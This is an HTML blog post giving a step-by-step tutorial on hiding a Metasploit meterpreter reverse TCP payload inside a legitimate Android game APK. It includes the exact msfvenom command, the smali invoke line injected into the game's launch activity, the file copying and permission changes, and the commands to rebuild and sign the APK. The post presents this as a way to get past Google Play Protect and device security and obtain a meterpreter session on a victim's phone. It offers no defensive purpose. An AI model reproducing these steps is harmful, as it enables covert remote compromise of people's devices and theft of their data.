    <p>In this blog I've discussed how we can generate a reverse shell or a meterpreter shell using metasploit
        framework, and then use that payload to embed the malicious code into a legit .apk file and bypass android
        security as well as google play protect.</p>

    <p>Here the conncept we are using to evade security is, we'll use a legit .apk file and decode it using 'apktool'.
        Then modify the AndroidManifest.xml and main activity .smali file and rebuild the .apk. Once complete, sign the
        .apk using jarsigner and then verifying the .apk into a new file using Zipalign
    </p>

        <h2>create a palyload using msfvenom</h2>
        <ul>
            <li>
                we will create a meterpreter reverse tcp payload using msfvenom. Make sure metasploit framework is
                installed in your machine.
            </li>
            <li>
                we can choose any palyload we wish to in msfvenom. I have used meterpreter reverse
                tcp(android/meterpreter/reverse_tcp) and not just reverse shell(android/shell/reverse_tcp) as
                meterpreter gives us more options to perform on victim than just reverse shell.
                <pre class="line-numbers">
                    <code class="language-bash">
                        msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.xx.xx LPORT=5555 R > payload.apk
                    </code>
                 </pre>
                <img src="/brsd/hacking/images/create-payload.PNG" alt="msfvenom command"
                    style="width: 800px; height: 300px;">
            </li>
            <li>
                we need to mention the host and port accordingly. The LPORT is the port where we will start a listener
                to sniff on victim and LHOST is the IP address of the machine where we want to listen.
            </li>
        </ul>
        <h2>Decode the created payload using 'apktool'</h2>
        <ul>
            <li>
                Now we need to decode the apk that we just got from msfvenom. We will use 'apktool' to decode as well to
                build back the apk.
            </li>
            <li>
                we can install 'apktool' in debian using [apt-get install apktool]. Install the tool from the ftp debian
                source by adding the url(deb http://ftp.de.debian.org/debian buster main) into (/etc/apt/sources.list)
                and comment out any other source to explicitly use the ftp source.
            </li>
            <li>
                Once installed decode the payload using [apktool d payload.apk]. The decoded app directory will be
                present in PWD with the same name as apk file, so in our case payload.
            </li>
            <img src="/brsd/hacking/images/decode-payload.PNG" alt="decoding payload"
                style="width: 800px; height: 300px;">
        </ul>
        <h2>Downlaod a legit apk and decode it</h2>
        <ul>
            <li>
                Download an apk where you can embed the payload. Here I'm using a android game called <a
                    href="https://run-bird-run.en.softonic.com/android">RunBird</a>. You can use any
                legit apk as per your wish.
            </li>
            <li>
                Once downloaded we can then decode it using 'apktool' as shown earlier.
            </li>
        </ul>
        <h2>Finding the mainactivity file and editing it.</h2>
        <ul>
            <li>
                So now as we have decoded the RunBird apk, we need to open the AndroidManifest.xml file from the
                runbrird directory. Androidmanifest XML file contains all the important information about the
                application such as permissions. Main activity is the first interface launching when a user open the
                application for the first time. Path to the main activity file can always be found above the main
                command in androidmanifest XML file.
            </li>
            <img src="/brsd/hacking/images/AndroidManifest.PNG" alt="AndroidManifest.xml file"
                style="width: 800px; height: 300px;">
            <li>
                From the above image we can see the main activity here is 'SplashActivity, and the path the it is
                com.migal.android.splashactivity, and as it is a .smali file, we could find this inside the smali
                directory of the unbundled apk. We can edit the SplashActivity.smali file using vim and add the payload
                launching segment as a oncreate method.
                <pre class="line-numbers">
                    <code class="language-bash">
                        invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
                    </code>
                 </pre>
            </li>
            <img src="/brsd/hacking/images/OncreateMethod.png" alt="Editing splashactivity file"
                style="width: 800px; height: 300px;">
        </ul>
        <h2>Add payload smail files to the original application file structure.</h2>
        <ul>
            <li>
                Now we need to copy the smali files from the payload to the smali file structure in the Runbird bundle.
            </li>
            <pre class="line-numbers" width="100px">
                <code class="language-bash">
                    cp -r payload/smali/com/*  runbird/smali/com/
                </code>
             </pre>

            <li>
                Now modify the permission from the AndroidManifest.xml file of Runbird bundle. For this we can open the
                AndroidManifest.xml files from both the bundle, i.e. payload and Runbird and copy just the permissions
                from the payload into the Runbird. But androidmanifest file is already having some permissions. We need
                to make sure that there will not be any duplicated permissions.
            </li>
            <img src="/brsd/hacking/images/add-permission.png" alt="editing androidmanifest file"
                style="width: 800px; height: 400px;">
            <li>
                The whole concept of first copying the smali files to Runbird from payload and then modifying the
                permissions on the Runbird AndroidManifest, was in order to bypass the google play protect and your
                internal smartphone device security. If we try to use the payload apk directly after signing
                it with a valid signature, it still gets blocked by google play protect atleast. So in here we have just
                added a line of paylaod and few extra permission requests from the device owner, into the already
                verified legit apk. Which in turns tricks google play protect and eventually the device internal
                security to believe it as a legit verified apk.
            </li>
        </ul>
        <h2>Rebuild the modified Runbird APK bundle</h2>
        <ul>
            <li>
                Now if everything has been followed everything and everystep executed without any error, well then we
                can proceed further to build back the Runbird apk.
            </li>
            <li>
                In order to build the apk we will use 'apktool'. We can run [apktool b ./runbird]. After build is
                complete the new .apk file will be present inside the 'runbird/dist/' folder.
            </li>
            <li>
                Next step is to generating a key using the keytool. Before sending the malicious APK that created to the
                victim user, that APK should be signed as a certified application. Generating a key is the first step of
                certifying the APK. Key can be created using Keytool.
            </li>
            <pre class="line-numbers" width="100px">
                <code class="language-bash">
                    keytool -genkey -v -keystore key1.keystore -alias kali -keyalg RSA -keysize 1024 -validity 22222
                </code>
             </pre>
        </ul>
        <h2>Sign the apk using jarsigner and zipalign</h2>
        <ul>
            <li>
                After creating the key, the malicious apk should be signed using that key. To do that we will use the
                jarsigner tool.
            </li>
            <pre class="line-numbers" width="100px">
                <code class="language-bash">
                    jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key1.keystore runbird.apk kali
                </code>
             </pre>
            <li>
                -verbose is to verify the output. -sigalg define the algorithm to sign. -digestalg define the digest
                algorithm. -keystore define the path to the key generated at the previous step. After that we can verify
                it using jarsigner from below command.
            </li>
            <pre class="line-numbers" width="100px">
                <code class="language-bash">
                    jarsigner -verify -verbose -certs runbird.apk
                </code>
             </pre>
            <li>
                Now after signing using jarsigner, we need to verify the runbird.apk into a new .apk file using
                Zipalign. This might not seem so useful, but trust me I believe that just by verifying to a new apk
                solves
                60% of the problem. We can do that using the below command.
            </li>
            <pre class="line-numbers" width="100px">
                <code class="language-bash">
                    zipalign -v 4 runbird.apk singed_jar.apk
                </code>
             </pre>
        </ul>
        <h2>Send new malicious apk and exploit using MSFconsole</h2>
        <ul>
            <li>
                First we need to transfer the apk to victims phone, and install it.
            </li>
            <li>
                On our machine (the machine which we have set the IP address for during the initial payload creation) we
                can start a listner using MSFconsole.
            </li>
            <img src="/brsd/hacking/images/MSFconsole.PNG" alt="MSFconsole" style="width: 800px; height: 400px;">
            <li>
                Once we are in msfconsole, we need to select the exploit and then set the payload. Finally setting up
                the LHOST and LPORT for listner.
            </li>
            <img src="/brsd/hacking/images/use-exploit.png" alt="setting up listner" style="width: 800px; height: 500px;">
            <li>
                Finally once set we can go ahead and type 'exploit' and that will start a listner on your end. So now
                whenever victim opens the app, hurraaayyyy!! you've a meterpreter session.
            </li>
            <img src="/brsd/hacking/images/victims-meterpreter.png" alt="meterpreter session of victim"
                style="width: 900px; height: 500px;">
            <li>
                This attack can be combined with few other attacks and we can get a permanent backdoor to the victim's
                device, which is pretty bad and out of scope for our discussion. I just wanted to show how we can bypass
                the existing Samsung galaxy s20 internal security and Google play protect.
            </li>
            <p style="color: red; font-size: large; text-align: center;">Cheers!!!</p>
